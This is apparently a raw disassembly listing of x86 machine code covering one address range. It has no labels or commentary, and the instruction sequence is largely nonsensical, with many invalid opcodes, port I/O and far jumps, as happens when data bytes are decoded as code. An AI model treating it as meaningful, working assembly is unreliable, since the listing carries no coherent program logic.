  4227ae:	call   0xf7f7:0x2dfb92f6
  4227b5:	dec    ecx
  4227b6:	jmp    DWORD PTR [edx-0x11]
  4227b9:	inc    esi
  4227ba:	lods   eax,DWORD PTR ds:[esi]
  4227bb:	stc    
  4227bc:	ja     0x422830
  4227be:	sub    al,0xe4
  4227c0:	push   ss
  4227c1:	mov    ah,0xa4
  4227c3:	out    dx,al
  4227c4:	sub    BYTE PTR [ebx],ch
  4227c6:	sti    
  4227c7:	fdiv   st,st(3)
  4227c9:	cs jl  0x4227bd
  4227cc:	bound  esp,QWORD PTR [ebp+ebp*1+0x10722d36]
  4227d3:	ficom  DWORD PTR [edx]
  4227d5:	xor    DWORD PTR ds:0xfb3bdf69,0x18428a6e
  4227df:	stos   DWORD PTR es:[edi],eax
  4227e0:	push   0x7
  4227e2:	loop   0x4227f8
  4227e4:	push   esi
  4227e5:	out    0x79,eax
  4227e7:	dec    esp
  4227e8:	mov    bh,0xde
  4227ea:	(bad)  
  4227eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ec:	push   esp
  4227ed:	pop    esi
  4227ee:	outs   dx,BYTE PTR ds:[esi]
  4227ef:	rcpps  xmm6,XMMWORD PTR [esp+ebp*1-0x28]
  4227f4:	nop
  4227f5:	adc    eax,ebx
  4227f7:	sbb    ch,BYTE PTR [eax]
  4227f9:	push   ss
  4227fa:	ja     0x4227eb
  4227fc:	mov    dl,0x6d
  4227fe:	push   cs
  4227ff:	sub    ebx,edi
  422801:	test   eax,0x89448652
  422806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422807:	int3   
  422808:	fidiv  DWORD PTR [edx+0x61]
  42280b:	dec    esi
  42280c:	lea    eax,[edx]
  42280e:	fisttp QWORD PTR [ebp-0x57d1a380]
  422814:	fistp  QWORD PTR [esi+0x4f40c8c4]
  42281a:	and    BYTE PTR [ebx],al
  42281c:	fcom   QWORD PTR [ebx]
  42281e:	pop    esi
  42281f:	cmp    edx,edi
  422821:	out    dx,eax
  422822:	fisttp WORD PTR [edx-0x6f85cf4f]
  422828:	mov    al,0x34
  42282a:	add    edi,ecx
  42282c:	in     eax,0x44
  42282e:	xchg   BYTE PTR [ebx+0x59a1ce68],ch
  422834:	xchg   DWORD PTR [ecx+0x54b32a68],edx
  42283a:	jl     0x4228ba
  42283c:	add    al,0x1a
  42283e:	mov    BYTE PTR [esi],bh
  422840:	fdivr  QWORD PTR [ebx+edi*4-0x75583898]
  422847:	idiv   edx
  422849:	test   DWORD PTR [edx+0x782279ae],edi
  42284f:	push   ebx
  422850:	addr16 push ds
  422852:	jno    0x4228bc
  422854:	ret    
  422855:	xor    edi,0xb5412670
  42285b:	mov    esp,DWORD PTR [eax]
  42285d:	push   ss
  42285e:	dec    ebp
  42285f:	imul   edx,DWORD PTR [ecx-0x43],0x14
  422863:	test   BYTE PTR [eax-0x51ca0ee2],ch
  422869:	lock je 0x422890
  42286c:	push   0x68
  42286e:	dec    edx
  42286f:	sub    al,0xa7
  422871:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  422873:	emms   
  422875:	dec    eax
  422876:	xchg   edx,eax
  422877:	jg     0x422816
  422879:	in     eax,0xf
  42287b:	int    0x5f
  42287d:	stos   BYTE PTR es:[edi],al
  42287e:	popf   
  42287f:	retf   0xd55
  422882:	ja     0x422818
  422884:	adc    eax,DWORD PTR [esi]
  422886:	and    eax,0xaab7b097
  42288b:	rcl    DWORD PTR [esi],0xaa
  42288e:	sbb    eax,DWORD PTR [ebp+esi*1-0x32]
  422892:	lahf   
  422893:	add    BYTE PTR [ebp-0x7c],dl
  422896:	sbb    DWORD PTR [ebx-0x4b],ebx
  422899:	mov    al,ds:0xb8cbb47c
  42289e:	mov    ds:0x7a8276a2,eax
  4228a3:	cwde   
  4228a4:	sbb    BYTE PTR [ecx+0x7ef31e04],dl
  4228aa:	enter  0xacd9,0xb8
  4228ae:	lods   eax,DWORD PTR ds:[esi]
  4228af:	rcr    BYTE PTR ds:0xdbc0b21d,cl
  4228b5:	jno    0x4228f0
  4228b7:	pop    ebp
  4228b8:	push   cs
  4228b9:	pop    ebp
  4228ba:	pop    eax
  4228bb:	mov    al,ds:0x9ab0d10c
  4228c0:	rcr    BYTE PTR [ebp+ecx*1-0x42840b2d],0x93
  4228c8:	leave  
  4228c9:	leave  
  4228ca:	jecxz  0x422933
  4228cc:	ret    0x2f60
  4228cf:	cli    
  4228d0:	icebp  
  4228d1:	ret    
  4228d2:	(bad)  
  4228d4:	iret   
  4228d5:	cmc    
  4228d6:	xor    ecx,eax
  4228d8:	mov    edi,0x57e91dd3
  4228dd:	mov    dh,0x46
  4228df:	popa   
  4228e0:	mov    esi,esp
  4228e2:	mov    bl,0x64
  4228e4:	pop    edi
  4228e5:	in     al,0xe6
  4228e7:	fdivrp st(5),st
  4228e9:	mov    cs,WORD PTR [esi]
  4228eb:	shl    ah,1
  4228ed:	mov    ebp,0x5af25745
  4228f2:	push   ss
  4228f3:	push   ebp
  4228f4:	dec    ebx
  4228f5:	mov    eax,0x3d2102b2
  4228fa:	pop    ebp
  4228fb:	pop    edx
  4228fc:	pop    ds
  4228fd:	(bad)  
  4228fe:	jo     0x42296c
  422900:	add    cl,BYTE PTR [edx+0x7c]
  422903:	lds    esp,FWORD PTR [ebx+0x52]
  422906:	pop    esp
  422907:	jp     0x422891
  422909:	xor    eax,0x6f942864
  42290e:	jmp    0x746f:0x91ecc9b6
  422915:	jl     0xbfd483f1
  42291b:	aaa    
  42291c:	rcl    ebp,cl
  42291e:	inc    esi
  42291f:	adc    DWORD PTR [edx],0xcefa18b4
  422925:	test   eax,0xc9b1ac29
  42292a:	mov    bh,dl
  42292c:	xchg   esi,eax
  42292d:	xor    ch,ch
  42292f:	cld    
  422930:	cmp    eax,0x2fe81e6e
  422935:	lock enter 0xe12,0xd4
  42293a:	pop    ds
  42293b:	xchg   DWORD PTR [ecx-0x2792125d],esi
  422941:	mov    ds:0x69037dac,eax
  422946:	inc    eax
  422947:	out    dx,eax
  422948:	stos   DWORD PTR es:[edi],eax
  422949:	loop   0x422949
  42294b:	and    al,dh
  42294d:	and    al,0x47
  42294f:	pop    esp
  422950:	fld    TBYTE PTR [esi+0x272dbf89]
  422956:	xor    bh,0x62
  422959:	push   ebp
  42295a:	xlat   BYTE PTR ds:[ebx]
  42295b:	loop   0x4229c8
  42295d:	mov    eax,ds:0xf79bc722
  422962:	dec    esp
  422963:	addr16 maskmovq mm3,(bad)
  422965:	neg    DWORD PTR [ebx+0x72]
  422968:	aas    
  422969:	pop    ds
  42296a:	jecxz  0x422925
  42296c:	mov    bh,0x9d
  42296e:	inc    edx
  42296f:	imul   ebx,DWORD PTR [eax-0x65b0b6b9],0xfffffff6
  422976:	(bad)  
  422977:	retf   0xb7da
  42297a:	pop    eax
  42297b:	or     al,0x84
  42297d:	out    0xd7,eax
  42297f:	sub    dl,dl
  422981:	mov    ds:0x807bc96e,eax
  422986:	jge    0x4229d2
  422988:	mov    ds:0x9fbb2d5c,eax
  42298d:	ret    
  42298e:	mov    DWORD PTR [edi],eax
  422990:	in     eax,0x3a
  422992:	mov    bl,BYTE PTR [edx]
  422994:	in     al,0x2a
  422996:	jno    0x4229e4
  422998:	push   es
  422999:	sahf   
  42299a:	dec    edi
  42299b:	lea    ebx,[edx-0x26]
  42299e:	xor    DWORD PTR [ecx-0x16],esi
  4229a1:	dec    esi
  4229a2:	popa   
  4229a3:	jmp    0xa8d:0x2554fad
  4229aa:	jp     0x4229d5
  4229ac:	bndstx [ebp+0x58c8d1b2],(bad)
  4229b3:	stos   BYTE PTR es:[edi],al
  4229b4:	pop    ecx
  4229b5:	pop    esp
  4229b6:	mov    dh,0xcc
  4229b8:	jbe    0x4229d7
  4229ba:	icebp  
  4229bb:	jnp    0x422a3b
  4229bd:	ss inc edi
  4229bf:	xor    ecx,DWORD PTR [edx]
  4229c1:	stos   BYTE PTR es:[edi],al
  4229c2:	mov    edi,0x9aed3232
  4229c7:	ret    0xa4f6
  4229ca:	push   cs
  4229cb:	cmp    DWORD PTR [eax],esi
  4229cd:	push   0xf56f48eb
  4229d2:	push   ds
  4229d3:	test   BYTE PTR [esi],bh
  4229d5:	dec    eax
  4229d6:	push   ebp
  4229d7:	call   0x7ef07c82
  4229dc:	cmc    
  4229dd:	popa   
  4229de:	push   ebx
  4229df:	idiv   BYTE PTR [eax-0x6362178]
  4229e5:	int3   
  4229e6:	(bad)  
  4229e7:	scas   eax,DWORD PTR es:[edi]
  4229e8:	xchg   edi,eax
  4229e9:	sbb    bl,BYTE PTR [ecx-0x38c9eb6a]
  4229ef:	aaa    
  4229f0:	leave  
  4229f1:	xchg   ecx,eax
  4229f2:	jl     0x4229a9
  4229f4:	mov    ds,WORD PTR [edx-0x1f46509]
  4229fa:	mov    bh,0xec
  4229fc:	and    bl,bh
  4229fe:	jmp    0x422a09
  422a00:	mov    ch,0x7d
  422a02:	push   edi
  422a03:	dec    esp
  422a04:	retf   
  422a05:	clc    
  422a06:	(bad)  
  422a07:	data16 aas 
  422a09:	adc    BYTE PTR [eax+eiz*8-0x692cacfa],al
  422a10:	ret    0x8508
  422a13:	sbb    dh,BYTE PTR [ecx-0x4c078493]
  422a19:	sub    BYTE PTR [esi],0xa5
  422a1c:	inc    edi
  422a1d:	and    eax,0x6a17ed19
  422a22:	lahf   
  422a23:	shl    DWORD PTR ds:0x2b3d348,1
  422a29:	cmc    
  422a2a:	and    BYTE PTR [eax],dh
  422a2c:	pop    edi
  422a2d:	mov    eax,DWORD PTR [ecx+ebx*8+0x1b5ff29a]
  422a34:	mov    esi,edx
  422a36:	test   DWORD PTR [ebx-0x1a],0x58d2aea5
  422a3d:	sub    esp,DWORD PTR [ebp-0x1fa76ce0]
  422a43:	ds lahf 
  422a45:	mov    bl,0xb8
  422a47:	jo     0x4229d7
  422a49:	mov    edi,0xc054fe7
  422a4e:	mov    ah,0x29
  422a50:	int3   
  422a51:	repz pop eax
  422a53:	sub    ebp,DWORD PTR [eax-0x61]
  422a56:	mov    bh,0x44
  422a58:	mov    bh,0x51
  422a5a:	outs   dx,BYTE PTR ds:[esi]
  422a5b:	lods   al,BYTE PTR ds:[esi]
  422a5c:	sahf   
  422a5d:	dec    edi
  422a5e:	push   esp
  422a5f:	cmc    
  422a60:	int3   
  422a61:	jl     0x422a21
  422a63:	cmp    ebx,DWORD PTR [eax+eax*4-0x3721ab36]
  422a6a:	inc    edi
  422a6b:	or     eax,0x503383b9
  422a70:	dec    DWORD PTR [esi+0x1a]
  422a73:	sbb    eax,0xe2f59a12
  422a78:	repnz cmc 
  422a7a:	push   DWORD PTR [ecx]
  422a7c:	push   es
  422a7d:	sti    
  422a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a7f:	xchg   ecx,eax
  422a80:	rcl    BYTE PTR [eax],0x8a
  422a83:	sar    BYTE PTR [ebx+0xa],cl
  422a86:	daa    
  422a87:	or     BYTE PTR [eax+0x0],cl
  422a8a:	das    
  422a8b:	or     dh,al
  422a8d:	push   ds
  422a8e:	mov    dh,BYTE PTR [edx]
  422a90:	mov    edx,0x31a898d1
  422a95:	icebp  
  422a96:	mov    esi,0x586068e
  422a9b:	fwait
  422a9c:	push   ecx
  422a9d:	jmp    0xcabbeb42
  422aa2:	push   ss
  422aa3:	jns    0x422a99
  422aa5:	inc    edx
  422aa6:	rol    cl,0x10
  422aa9:	sub    al,0x4
  422aab:	push   edi
  422aac:	test   eax,0x611985c8
  422ab1:	shl    DWORD PTR [ebx+0x40b0bc4e],0xee
  422ab8:	call   0x76c866b8
  422abd:	popf   
  422abe:	xlat   BYTE PTR ds:[ebx]
  422abf:	into   
  422ac0:	cmp    BYTE PTR [edx],cl
  422ac2:	xor    BYTE PTR [eax+0x51],cl
  422ac5:	das    
  422ac6:	sub    edx,DWORD PTR [ebx]
  422ac8:	imul   edi,edx,0x4c
  422acb:	add    eax,0x5b3e58b4
  422ad0:	sahf   
  422ad1:	pop    edx
  422ad2:	(bad)  
  422ad4:	fwait
  422ad5:	sahf   
  422ad6:	lds    eax,FWORD PTR [edx+eiz*4+0x287a152a]
  422add:	cdq    
  422ade:	bound  eax,QWORD PTR ds:0xe23bf073
  422ae4:	pop    ss
  422ae5:	(bad)  
  422ae6:	xor    BYTE PTR [ecx-0x3a076af],al
  422aec:	jo     0x422b62
  422aee:	in     eax,0x3
  422af0:	int    0xef
  422af2:	cmp    ecx,edx
  422af4:	jno    0x422ab3
  422af6:	jmp    0xd043:0xcbbe44ea
  422afd:	out    dx,eax
  422afe:	cmp    BYTE PTR [edx+0x375bd79a],bl
  422b04:	mov    eax,ds:0x94e5ffd7
  422b09:	(bad)  
  422b0a:	push   edx
  422b0b:	aaa    
  422b0c:	icebp  
  422b0d:	stc    
  422b0e:	inc    ebp
  422b0f:	mov    edi,0x3e6f40f2
  422b14:	cmc    
  422b15:	push   edi
  422b16:	nop
  422b17:	dec    DWORD PTR [esi-0x2c]
  422b1a:	inc    esp
  422b1b:	xchg   DWORD PTR [ebx+0x72],ebx
  422b1e:	push   0x4383fb5b
  422b23:	cmc    
  422b24:	xchg   ebp,eax
  422b25:	popa   
  422b26:	xchg   esi,eax
  422b27:	xor    DWORD PTR [ebx-0x7b],edx
  422b2a:	arpl   WORD PTR [edx+0x7827828c],dx
  422b30:	sbb    ebp,ebp
  422b32:	cmp    edi,edx
  422b34:	sub    eax,0x5ee51066
  422b39:	loope  0x422bb5
  422b3b:	ins    DWORD PTR es:[edi],dx
  422b3c:	cmp    al,0xe
  422b3e:	repz ja 0x422b4b
  422b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b42:	push   ds
  422b43:	mov    bh,0xc5
  422b45:	ror    DWORD PTR [ebx],cl
  422b47:	out    0x1d,eax
  422b49:	dec    edi
  422b4a:	or     BYTE PTR [ecx],0x46
  422b4d:	loopne 0x422b87
  422b4f:	lock jl 0x422ae3
  422b52:	je     0x422ae9
  422b54:	mov    DWORD PTR [edx-0x27d80a7a],edi
  422b5a:	pop    eax
  422b5b:	or     eax,0x728808da
  422b60:	sbb    al,0x7e
  422b62:	shl    ecx,0xab
  422b65:	xlat   BYTE PTR ds:[ebx]
  422b66:	xchg   dl,bl
  422b68:	xchg   DWORD PTR [edi],ecx
  422b6a:	out    0xa7,al
  422b6c:	mov    ds:0x5d8546aa,al
  422b71:	mov    bh,0xcc
  422b73:	stos   BYTE PTR es:[edi],al
  422b74:	inc    esi
  422b75:	(bad)  
  422b76:	sub    al,BYTE PTR [eax-0x24]
  422b79:	dec    esp
  422b7a:	inc    eax
  422b7b:	or     DWORD PTR [edx+0x2d],ecx
  422b7e:	sub    al,0x1e
  422b80:	mov    ah,0x7d
  422b82:	pop    ecx
  422b83:	jge    0x422bf2
  422b85:	les    esp,FWORD PTR [ecx+0x5f]
  422b88:	xor    DWORD PTR [edx],edx
  422b8a:	jl     0x422b7a
  422b8c:	pop    ebp
  422b8d:	pop    edi
  422b8e:	std    
  422b8f:	xor    esp,esi
  422b91:	sbb    ebp,DWORD PTR [eax-0x697172ac]
  422b97:	out    dx,al
  422b98:	sub    edi,0x7c
  422b9b:	jns    0x422b57
  422b9d:	ds cmp bl,bl
  422ba0:	dec    BYTE PTR [edi+ebx*8+0x4c142e1c]
  422ba7:	dec    edi
  422ba8:	mov    ebx,0xcf96fb6
  422bad:	rcl    DWORD PTR [ecx],cl
  422baf:	mov    fs,WORD PTR [eax-0x549c3a01]
  422bb5:	sbb    eax,DWORD PTR [edx+0x4f5afe9a]
  422bbb:	pop    es
  422bbc:	jne    0x422bcf
  422bbe:	and    dh,dl
  422bc0:	pushf  
  422bc1:	pop    ebp
  422bc2:	mov    al,ds:0xf2651ee4
  422bc7:	popa   
  422bc8:	pop    edi
  422bc9:	fs out 0x66,eax
  422bcc:	and    al,0xf8
  422bce:	pop    ss
  422bcf:	into   
  422bd0:	adc    al,0x4c
  422bd2:	outs   dx,BYTE PTR ds:[esi]
  422bd3:	xlat   BYTE PTR ds:[ebx]
  422bd4:	and    ch,BYTE PTR [edi+0x711ee8f4]
  422bda:	jmp    0x67ea11ae
  422bdf:	outs   dx,BYTE PTR ds:[esi]
  422be0:	and    eax,esi
  422be2:	mov    ah,0x76
  422be4:	mov    eax,0x2b8e137c
  422be9:	inc    esi
  422bea:	retf   0x9bc1
  422bed:	jb     0x422bb0
  422bef:	xchg   BYTE PTR [ebp+0x4662dc10],ah
  422bf5:	jae    0x422bd4
  422bf7:	push   DWORD PTR [ebp+0x4f42bfcf]
  422bfd:	dec    esp
  422bfe:	jge    0x422b83
  422c00:	mov    bl,0xae
  422c02:	add    al,0x80
  422c04:	adc    BYTE PTR [edi+0x51],bl
  422c07:	lods   eax,DWORD PTR ds:[esi]
  422c08:	rcl    DWORD PTR [edx],0xe5
  422c0b:	rcl    DWORD PTR [esp+ecx*8-0x3af4d22b],1
  422c12:	add    eax,0x5b3c9920
  422c17:	xchg   ecx,eax
  422c18:	add    al,0x96
  422c1a:	jmp    0x7f6eb4f4
  422c1f:	pop    eax
  422c20:	sbb    DWORD PTR [ecx-0x2],esi
  422c23:	lock mov ecx,0xc1755831
  422c29:	jg     0x422c26
  422c2b:	mov    ch,0xfd
  422c2d:	scas   eax,DWORD PTR es:[edi]
  422c2e:	mov    WORD PTR [edx+eax*4+0x3f12443],?
  422c35:	push   esi
  422c36:	mov    dl,0xc6
  422c38:	dec    ebx
  422c39:	sbb    ch,BYTE PTR [ecx+edi*2-0x4]
  422c3d:	xor    esi,DWORD PTR [ecx-0x43]
  422c40:	jo     0x422c41
  422c42:	(bad)  
  422c43:	mov    eax,ds:0x6c40b96d
  422c48:	fmul   QWORD PTR [ebx+0x33]
  422c4b:	data16 cli 
  422c4d:	mov    esp,0xa5f0f810
  422c52:	sti    
  422c53:	dec    edi
  422c54:	icebp  
  422c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c56:	mov    dl,0xe3
  422c58:	xchg   BYTE PTR [esi],cl
  422c5a:	pop    esi
  422c5b:	arpl   WORD PTR [esp+eax*4-0x3e52b95d],sp
  422c62:	push   eax
  422c63:	push   eax
  422c64:	sub    BYTE PTR [eax],ah
  422c66:	bound  esp,QWORD PTR [ebx+0x7ed07d68]
  422c6c:	cmp    al,0x4d
  422c6e:	mov    bh,0x40
  422c70:	push   0x57
  422c72:	pop    ebp
  422c73:	mov    dl,0xab
  422c75:	mov    dl,bh
  422c77:	sahf   
  422c78:	fcmovnbe st,st(6)
  422c7a:	and    DWORD PTR [edi],edx
  422c7c:	add    edi,ebp
  422c7e:	jo     0x422cbb
  422c80:	xchg   esi,eax
  422c81:	pop    eax
  422c82:	ret    0xb1c8
  422c85:	sbb    edx,edx
  422c87:	push   eax
  422c88:	adc    al,0x4d
  422c8a:	or     dh,BYTE PTR [ebx+0x2cd12c4d]
  422c90:	outs   dx,BYTE PTR ds:[esi]
  422c91:	or     al,0xed
  422c93:	mov    esp,0x51cdd175
  422c98:	aas    
  422c99:	cli    
  422c9a:	pop    ss
  422c9b:	daa    
  422c9c:	cmp    BYTE PTR [esp+ecx*4-0x28],cl
  422ca0:	fimul  WORD PTR ds:0xc7e843ce
  422ca6:	fadd   DWORD PTR [edi-0x1c]
  422ca9:	adc    ah,BYTE PTR [ebx+0xebd6df6]
  422caf:	sbb    eax,0x70fba25f
  422cb4:	or     ecx,DWORD PTR [edx+0x4badeea3]
  422cba:	sub    eax,DWORD PTR [ebp+eiz*2-0x2f]
  422cbe:	cmp    eax,DWORD PTR [edi]
  422cc0:	popa   
  422cc1:	jne    0x422cab
  422cc3:	adc    al,0xa
  422cc5:	into   
  422cc6:	imul   eax,edi,0x731413b9
  422ccc:	mov    ebp,0x54919da8
  422cd1:	scas   eax,DWORD PTR es:[edi]
  422cd2:	jmp    0x422d11
  422cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cd5:	popf   
  422cd6:	inc    esi
  422cd7:	scas   eax,DWORD PTR es:[edi]
  422cd8:	jb     0x422c62
  422cda:	popf   
  422cdb:	(bad)  
  422cdc:	nop
  422cdd:	inc    edx
  422cde:	shl    BYTE PTR [ebx+0x3f895af0],cl
  422ce4:	call   0x76ef7f27
  422ce9:	sub    DWORD PTR [edx],esp
  422ceb:	mov    esp,0xd5d85ec4
  422cf0:	mov    DWORD PTR [edi],edi
  422cf2:	pop    ebx
  422cf3:	fwait
  422cf4:	(bad)  
  422cf5:	pop    ebp
  422cf6:	ud0    ebx,DWORD PTR [edx-0x6b421c63]
  422cfd:	add    dh,dl
  422cff:	popf   
  422d00:	(bad)
  422d04:	lods   al,BYTE PTR ds:[esi]
  422d05:	dec    esp
  422d06:	fsubr  st(1),st
  422d08:	(bad)  
  422d09:	sub    esp,DWORD PTR [edx]
  422d0b:	in     al,dx
  422d0c:	push   esi
  422d0d:	jge    0x422d53
  422d0f:	add    ebx,eax
  422d11:	ja     0x422d0d
  422d13:	xor    ecx,DWORD PTR [ecx]
  422d15:	sbb    DWORD PTR gs:[edi+0x26d85a44],ebp
  422d1c:	sbb    ch,BYTE PTR [eax-0x72f5f548]
  422d22:	das    
  422d23:	or     ecx,DWORD PTR [ecx]
  422d25:	test   al,0x4c
  422d27:	fild   DWORD PTR [edx]
  422d29:	fidivr DWORD PTR [ebp-0x76a756c5]
  422d2f:	add    BYTE PTR [esi-0x2e0ed50a],ch
  422d35:	mov    dh,BYTE PTR ds:[edx+ecx*1]
  422d39:	std    
  422d3a:	inc    esi
  422d3b:	push   es
  422d3c:	fld    QWORD PTR [ebx-0x7848ced1]
  422d42:	or     edi,0x3738ae95
  422d48:	loop   0x422d09
  422d4a:	imul   BYTE PTR [eax+eax*8-0x7201ec4d]
  422d51:	or     esi,ebp
  422d53:	cmp    ebx,DWORD PTR [edi+0x46]
  422d56:	test   DWORD PTR [ecx-0x1286b238],ecx
  422d5c:	pop    esi
  422d5d:	adc    edx,0x1e
  422d60:	hlt    
  422d61:	inc    ebx
  422d62:	mov    al,0xeb
  422d64:	in     al,dx
  422d65:	popfw  
  422d67:	sbb    al,0x47
  422d69:	lods   al,BYTE PTR ds:[esi]
  422d6a:	mov    ebp,0x64726dc0
  422d6f:	add    al,BYTE PTR [ecx+ecx*4+0x20]
  422d73:	sbb    al,0x66
  422d75:	(bad)  
  422d76:	cmc    
  422d77:	mov    bl,BYTE PTR [ebx]
  422d79:	jecxz  0x422d7a
  422d7b:	sub    edi,DWORD PTR [ecx+0x4e]
  422d7e:	cwde   
  422d7f:	add    eax,0x35fc381
  422d84:	push   esi
  422d85:	adc    bl,BYTE PTR [eax+0x53]
  422d88:	inc    ebx
  422d89:	inc    eax
  422d8a:	sbb    al,0x76
  422d8c:	jecxz  0x422da0
  422d8e:	pushf  
  422d8f:	mov    dl,0x5b
  422d91:	call   0x7574b2c1
  422d96:	xor    BYTE PTR [esi],cl
  422d98:	ror    BYTE PTR [eax+0x68],1
  422d9b:	(bad)  
  422d9c:	dec    esp
  422d9d:	retf   0x5a37
  422da0:	sbb    DWORD PTR ds:0xb497680e,esp
  422da6:	aad    0x59
  422da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422da9:	cmp    al,0xee
  422dab:	outs   dx,DWORD PTR ds:[esi]
  422dac:	pushf  
  422dad:	cli    
  422dae:	test   BYTE PTR [ebp-0x16],bl
  422db1:	aas    
  422db2:	pop    ds
  422db3:	ins    BYTE PTR es:[edi],dx
  422db4:	into   
  422db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422db6:	inc    esp
  422db7:	push   edi
  422db8:	xchg   ecx,eax
  422db9:	pop    ebp
  422dba:	jnp    0x422da0
  422dbc:	dec    eax
  422dbd:	adc    BYTE PTR [edi+esi*1+0x4d],bl
  422dc1:	mov    dl,0xe6
  422dc3:	in     al,dx
  422dc4:	mov    ebp,0x79d22c1c
  422dc9:	sbb    al,BYTE PTR [esi]
  422dcb:	daa    
  422dcc:	nop
  422dcd:	mov    DWORD PTR [ebp+0x12f411df],esp
  422dd3:	jecxz  0x422e08
  422dd5:	mov    ecx,DWORD PTR [ecx-0x49]
  422dd8:	cmp    al,0x8a
  422dda:	lahf   
  422ddb:	mov    al,0xf4
  422ddd:	sub    eax,DWORD PTR [edx-0x44e84f9a]
  422de3:	xchg   edi,eax
  422de4:	cs (bad) 
  422de6:	ins    DWORD PTR es:[edi],dx
  422de7:	adc    DWORD PTR [ebx+0x48],ebp
  422dea:	pop    ss
  422deb:	stos   DWORD PTR es:[edi],eax
  422dec:	(bad)  [ebx+0x0]
  422def:	ds ret 0xb8f
  422df3:	mov    ch,0xf7
  422df5:	xlat   BYTE PTR ds:[ebx]
  422df6:	addr16 lock int3 
  422df9:	xlat   BYTE PTR ds:[ebx]
  422dfa:	(bad)  
  422dfb:	mov    al,ds:0x8cc0b291
  422e00:	jecxz  0x422dd4
  422e02:	pusha  
  422e03:	call   0x9e242fc8
  422e08:	rcr    DWORD PTR [esp+ebx*8],0x1b
  422e0c:	mov    ds:0x72011e7e,eax
  422e11:	push   edi
  422e12:	(bad)  
  422e13:	sar    ah,0x8f
  422e16:	sbb    eax,0x1dfa9127
  422e1b:	jge    0x422dc6
  422e1d:	stos   DWORD PTR es:[edi],eax
  422e1e:	push   eax
  422e1f:	in     eax,0x7e
  422e21:	or     al,0xf8
  422e23:	pop    edx
  422e24:	xor    DWORD PTR [eax],ebx
  422e26:	mov    ah,0x81
  422e28:	out    0xa4,al
  422e2a:	fwait
  422e2b:	out    0x86,eax
  422e2d:	adc    esi,esp
  422e2f:	mov    esp,0x5b7d9228
  422e34:	(bad)
  422e37:	lds    ebp,FWORD PTR [edi-0x11e4edde]
  422e3d:	into   
  422e3e:	lahf   
  422e3f:	mov    ds:0x7759dcd6,al
  422e44:	dec    ebp
  422e45:	lods   al,BYTE PTR ds:[esi]
  422e46:	jmp    0x422df6
  422e48:	xchg   edi,eax
  422e49:	pop    DWORD PTR [esi+0x5eaea168]
  422e4f:	jne    0x422e18
  422e51:	cmp    eax,0xc4a3ebd7
  422e56:	imul   esi,DWORD PTR [ebp-0x494f69ab],0x4581e05
  422e60:	mov    ecx,0x7e26b43b
  422e65:	inc    BYTE PTR ds:0x626eee56
  422e6b:	push   eax
  422e6c:	pop    eax
  422e6d:	and    ecx,ebp
  422e6f:	or     al,0x3c
  422e71:	jmp    0x422eee
  422e73:	cmp    eax,0xdf86259b
  422e78:	mov    BYTE PTR [ecx+0x3a],dh
  422e7b:	pop    es
  422e7c:	cdq    
  422e7d:	jb     0x422e21
  422e7f:	mov    al,0xa9
  422e81:	repz pop eax
  422e83:	das    
  422e84:	ins    BYTE PTR es:[edi],dx
  422e85:	(bad)  
  422e86:	cmp    DWORD PTR [esp+ebx*2+0xb4666e2],ebx
  422e8d:	and    dl,BYTE PTR [edx+0x3b31ad4f]
  422e93:	sahf   
  422e94:	ins    BYTE PTR es:[edi],dx
  422e95:	push   ss
  422e96:	push   ds
  422e97:	sub    ebp,edx
  422e99:	(bad)  
  422e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e9b:	fnstenv [edi+0x1f190ef7]
  422ea1:	in     eax,dx
  422ea2:	cwde   
  422ea3:	dec    eax
  422ea4:	jmp    0x256d:0x8fc204f7
  422eab:	mov    ah,0x66
  422ead:	or     DWORD PTR [edx+0x2f641de2],0xdd02b968
  422eb7:	scas   al,BYTE PTR es:[edi]
  422eb8:	cmp    DWORD PTR [eax-0x77a80a6d],0xffffff8d
  422ebf:	mov    dh,BYTE PTR [eax]
  422ec1:	push   ss
  422ec2:	xor    edx,DWORD PTR [esi-0x78711b52]
  422ec8:	fwait
  422ec9:	push   ds
  422eca:	popf   
  422ecb:	aam    0x1c
  422ecd:	jmp    0x422f12
  422ecf:	and    eax,0xf114aedd
  422ed4:	sub    ch,BYTE PTR [esi]
  422ed6:	push   esp
  422ed7:	dec    edi
  422ed8:	mov    ch,0xd6
  422eda:	dec    ebp
  422edb:	adc    eax,DWORD PTR [edi+0x3952eb01]
  422ee1:	lods   al,BYTE PTR ds:[esi]
  422ee2:	sub    ebp,DWORD PTR [eax+0x1cb913bf]
  422ee8:	jnp    0x422eec
  422eea:	fsub   DWORD PTR [edi-0x1f]
  422eed:	push   edi
  422eee:	jns    0x422e8c
  422ef0:	jmp    0xb2784420
  422ef5:	mov    gs,WORD PTR [esi-0x6604ae24]
  422efb:	jno    0x422e80
  422efd:	mov    bl,0xc2
  422eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f00:	xchg   edx,eax
  422f01:	(bad)  
  422f03:	shl    ecx,0x96
  422f06:	cmp    al,0xee
  422f08:	pop    ds
  422f09:	jae    0x422f0c
  422f0b:	push   cs
  422f0c:	les    esi,FWORD PTR [ebp+ebp*1+0x1015b733]
  422f13:	inc    esi
  422f14:	mov    esi,0x693d3581
  422f19:	inc    ebp
  422f1a:	cmp    al,dl
  422f1c:	test   BYTE PTR [ecx],cl
  422f1e:	xor    al,BYTE PTR [eax]
  422f20:	add    al,0x34
  422f22:	scas   eax,DWORD PTR es:[edi]
  422f23:	mov    ds,WORD PTR [ecx]
  422f25:	adc    al,0x3f
  422f27:	cmp    DWORD PTR [esi+esi*8],edx
  422f2a:	in     al,0xc4
  422f2c:	xchg   esp,eax
  422f2d:	sub    eax,0xce55515b
  422f32:	adc    al,0x38
  422f34:	hlt    
  422f35:	(bad)  
  422f37:	mov    cl,0x59
  422f39:	test   DWORD PTR [esp+esi*1+0x793d907a],eax
  422f40:	mov    bl,0x55
  422f42:	addr16 loop 0x422f67
  422f45:	add    dl,BYTE PTR [esi+0x2b8fc7f0]
  422f4b:	push   cs
